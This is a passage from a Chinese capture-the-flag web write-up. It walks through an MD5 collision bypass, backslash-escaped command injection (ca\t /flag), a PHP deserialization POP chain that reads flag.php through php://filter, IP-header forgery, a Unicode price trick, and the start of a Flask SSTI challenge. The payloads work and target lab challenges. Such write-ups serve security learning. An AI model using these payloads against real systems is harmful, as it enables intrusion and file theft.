(<span class="hljs-string">&quot;md5 is funny ~&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
<p>下面的MD5可以用MD5强碰撞来绕过</p>
<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">a<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%00</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%55</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span>&amp;b<span class="hljs-operator">=</span><span class="hljs-variable">%4</span>d<span class="hljs-variable">%c9</span><span class="hljs-variable">%68</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%0</span>e<span class="hljs-variable">%e3</span><span class="hljs-variable">%5</span><span class="hljs-keyword">c</span><span class="hljs-variable">%20</span><span class="hljs-variable">%95</span><span class="hljs-variable">%72</span><span class="hljs-variable">%d4</span><span class="hljs-variable">%77</span><span class="hljs-variable">%7</span>b<span class="hljs-variable">%72</span><span class="hljs-variable">%15</span><span class="hljs-variable">%87</span><span class="hljs-variable">%d3</span><span class="hljs-variable">%6</span>f<span class="hljs-variable">%a7</span><span class="hljs-variable">%b2</span><span class="hljs-variable">%1</span>b<span class="hljs-variable">%dc</span><span class="hljs-variable">%56</span><span class="hljs-variable">%b7</span><span class="hljs-variable">%4</span>a<span class="hljs-variable">%3</span>d<span class="hljs-variable">%c0</span><span class="hljs-variable">%78</span><span class="hljs-variable">%3</span>e<span class="hljs-variable">%7</span>b<span class="hljs-variable">%95</span><span class="hljs-variable">%18</span><span class="hljs-variable">%af</span><span class="hljs-variable">%bf</span><span class="hljs-variable">%a2</span><span class="hljs-variable">%02</span><span class="hljs-variable">%a8</span><span class="hljs-variable">%28</span><span class="hljs-variable">%4</span>b<span class="hljs-variable">%f3</span><span class="hljs-variable">%6</span>e<span class="hljs-variable">%8</span>e<span class="hljs-variable">%4</span>b<span class="hljs-variable">%55</span><span class="hljs-variable">%b3</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%42</span><span class="hljs-variable">%75</span><span class="hljs-variable">%93</span><span class="hljs-variable">%d8</span><span class="hljs-variable">%49</span><span class="hljs-variable">%67</span><span class="hljs-variable">%6</span>d<span class="hljs-variable">%a0</span><span class="hljs-variable">%d1</span><span class="hljs-variable">%d5</span><span class="hljs-variable">%5</span>d<span class="hljs-variable">%83</span><span class="hljs-variable">%60</span><span class="hljs-variable">%fb</span><span class="hljs-variable">%5</span>f<span class="hljs-variable">%07</span><span class="hljs-variable">%fe</span><span class="hljs-variable">%a2</span><br></code></pre></td></tr></table></figure>
<p>反引号为system<br>ls&amp;cat被禁用？<br>没关系<br>反斜杠绕过</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>l\s%<span class="hljs-number">20</span>/<br><span class="hljs-attribute">cmd</span><span class="hljs-operator">=</span>ca\t%<span class="hljs-number">20</span>/flag<br></code></pre></td></tr></table></figure>

<p>强碰撞不建议用hackbar，用burp</p>
<h2 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h2><p>先上源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]))&#123;<br>    @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;pop&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <br></code></pre></td></tr></table></figure>

<p>一共三个类</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">Modifier<br><span class="hljs-keyword">Show</span><br><span class="hljs-keyword">Test</span><br></code></pre></td></tr></table></figure>

<p>先分析Modifier类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>定义一个append函数<br>有个include，我们可以用伪协议来获得flag.php的内容，而include需要__invoke方法来调用，__invoke触发方法为：当尝试以调用函数的方式调用一个对象时，方法会被自动调用。。</p>
<p>再来分析Show类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span>=<span class="hljs-string">&#x27;index.php&#x27;</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span>.<span class="hljs-variable language_">$this</span>-&gt;source.<span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>先看__toString方法，是个输出点</p>
<p>最后分析Test类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>__get()方法，(当访问类中的私有属性或者是不存在的属性，触发__get魔术方法)，而Modifier类中有私有属性，这两个类配合一下</p>
<p>思路：<br>首先使</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$var</span>=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/read=convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure>
<p>由于protect被保护的变量类外部无法访问，所以在类里面定义<br>然后使用Test类里的__get方法调用Modifier类中的__invoke方法，使$p这个变量为Modifier这个对象就可以调用__invoke方法，最后使用Show这个类里的__toString方法输出被包含的flag<br>使用Test类中的__Get方法调用Modifier类中的__invoke方法很简单<br>使Test-&gt;p&#x3D;new Modifier();<br>Show中__wakeup方法 ，preg_match对类中的source进行比较，将它作为字符串，所以就调用了__toString方法<br>__toString是在对象被当成字符串的时候调用<br>所以这里我们需要使Show-&gt;source &#x3D; new Show();<br>即可调用__toString方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Modifier</span> </span>&#123;<br>    <span class="hljs-keyword">protected</span>  <span class="hljs-variable">$var</span>=<span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">append</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span>&#123;<br>        <span class="hljs-keyword">include</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">append</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-keyword">var</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;index.php&quot;</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome to &#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;source . <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;str-&gt;source;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$p</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;p = <span class="hljs-keyword">array</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable">$function</span> = <span class="hljs-variable language_">$this</span>-&gt;p;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$function</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Modifier</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$c</span>-&gt;p = <span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$b</span>-&gt;source = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$b</span>-&gt;source-&gt;str = <span class="hljs-variable">$c</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>);<br></code></pre></td></tr></table></figure>

<h2 id="MRCTF2020-PYWebsite"><a href="#MRCTF2020-PYWebsite" class="headerlink" title="[MRCTF2020]PYWebsite"></a>[MRCTF2020]PYWebsite</h2><p><img src="/images/MQ083D130OO6OYCG15V.png" srcset="/img/loading.gif" lazyload><br>这里的buy it now 是有超链接的<br>微信扫一扫先<br><img src="/images/YNUL3D1EKV4C5VP4.png" srcset="/img/loading.gif" lazyload><br>拜托！你不会真的想PY到flag吧，这样可是违规的！再好好分析一下界面代码吧<br>好吧，另辟蹊径<br>回到主页面，审计源代码</p>
<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">function</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">code</span>)&#123;<br>     <span class="hljs-built_in">hash</span> = hex_md5(code);<br>     <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span>;<br>   &#125;<br>   <span class="hljs-keyword">function</span> <span class="hljs-title function_">validate</span>(<span class="hljs-params"></span>)&#123;<br>     <span class="hljs-keyword">var</span> code = document.getElementById(<span class="hljs-string">&quot;vcode&quot;</span>).value;<br>     <span class="hljs-keyword">if</span> (code != <span class="hljs-string">&quot;&quot;</span>)&#123;<br>       <span class="hljs-keyword">if</span>(hex_md5(code) == <span class="hljs-string">&quot;0cd4da0223c0b280829dc3ea458d655c&quot;</span>)&#123;<br>         alert(<span class="hljs-string">&quot;您通过了验证！&quot;</span>);<br>         window.location = <span class="hljs-string">&quot;./flag.php&quot;</span><br>       &#125;<span class="hljs-keyword">else</span>&#123;<br>         alert(<span class="hljs-string">&quot;你的授权码不正确！&quot;</span>);<br>       &#125;<br>     &#125;<span class="hljs-keyword">else</span>&#123;<br>       alert(<span class="hljs-string">&quot;请输入授权码&quot;</span>);<br>     &#125;<br>     <br>   &#125;<br></code></pre></td></tr></table></figure>
<p>这里有个flag.php，看看能不能直接查看<br><img src="/images/Y1HGFWJWYOPXT3ZN3L.png" srcset="/img/loading.gif" lazyload><br>重点是这一句话：<br>验证逻辑是在后端的，除了购买者和我自己，没有人可以看到flag<br>除了购买者和我自己？<br>伪造IP试试<br><img src="/images/6OLV4250O66RIYHW5SM.png" srcset="/img/loading.gif" lazyload><br><img src="/images/JFJQBMOYHR56UBL4MK.png" srcset="/img/loading.gif" lazyload><br>源代码中查看flag</p>
<h2 id="ASIS-2019-Unicorn-shop"><a href="#ASIS-2019-Unicorn-shop" class="headerlink" title="[ASIS 2019]Unicorn shop"></a>[ASIS 2019]Unicorn shop</h2><p><img src="/images/HHE63JPRZK5VP8UO.png" srcset="/img/loading.gif" lazyload><br>看到给的历史输入，还以为是sql注入，注入了半天毛都没有<br>看看源码👀<br><img src="/images/CCBM03PTUN15DEK50F.png" srcset="/img/loading.gif" lazyload><br>这里提示<code>&lt;meta charset=&quot;utf-8&quot;&gt;</code>非常重要<br>但是很多的网站都是utf-8编码，为什么会说这里很重要?<br>回到购买界面，我们输入其他的价格，发现输入10的时候有提示<br><img src="/images/SJJVW90CRI7BP0MK.png" srcset="/img/loading.gif" lazyload><br>只能输入一个字符<br>一个字符能够购买的就只有前三只独角兽，但是都没有购买成功，想必突破点在第四只独角兽上，先找到一个比1337大的数<br>当什么都不输入直接购买时会出现以下提示<br><img src="/images/435G6RU5DA6HCN26.png" srcset="/img/loading.gif" lazyload><br>看一下 unicodedata.numeric这个函数，他的参数是price<br>前端html使用的是utf-8，后端python处理使用的是unicode，编码不一致造成了转码问题<br><img src="/images/LQ1B771Y202IYPQOL.png" srcset="/img/loading.gif" lazyload><br><img src="/images/D585S3GQB0CTVOHB9L.png" srcset="/img/loading.gif" lazyload><br>传入万试试<br><img src="/images/IZ87OSEJ633X4O7QBBE.png" srcset="/img/loading.gif" lazyload><br>flag成功回显<br>如果不想用万的话可以去找一个Unicode编码网站<br><a target="_blank" rel="noopener" href="https://www.compart.com/en/unicode">传送门</a><br>例如输入ten thousand<br><img src="/images/NMW9LJLO5NYALOX.png" srcset="/img/loading.gif" lazyload><br><img src="/images/RT4UKBT5P80RZT5.png" srcset="/img/loading.gif" lazyload><br>找到一个Numeric Value大于等于10000的数值<br>直接复制上面的特殊符号或者下面的UTF-8 Encoding<br>找到UTF-8 Encoding：0xE1 0x8D 0xBC<br>将0x替换成%<br><img src="/images/LLNDIZB7VBGLF9K12S.png" srcset="/img/loading.gif" lazyload><br>购买得到flag</p>
<h2 id="WesternCTF2018-shrine"><a href="#WesternCTF2018-shrine" class="headerlink" title="[WesternCTF2018]shrine"></a>[WesternCTF2018]shrine</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> flask<br><span class="hljs-keyword">import</span> os<br><br>app = flask.Flask(__name__)<span class="hljs-comment">#创建Flask应用实例、初始化Flask应用</span><br><br>app.config[<span class="hljs-string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="hljs-string">&#x27;FLAG&#x27;</span>)<span class="hljs-comment">#从环境变量中获取名为&#x27;FLAG&#x27;的值，然后将其存储在Flask应用的配置中</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><span class="hljs-comment">#定义根路由&#x27;/&#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">open</span>(__file__).read()<span class="hljs-comment">#返回当前文件的内容</span><br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span><span class="hljs-comment">#定义路由 /shrine/&lt;path:shrine&gt;，使用 Jinja2 模板渲染路径参数：</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shrine</span>(<span class="hljs-params">shrine</span>):<span class="hljs-comment">#当访问 /shrine/&lt;path:shrine&gt; 路径时，会调用 shrine 函数</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_jinja</span>(<span class="hljs-params">s</span>):<br>        s = 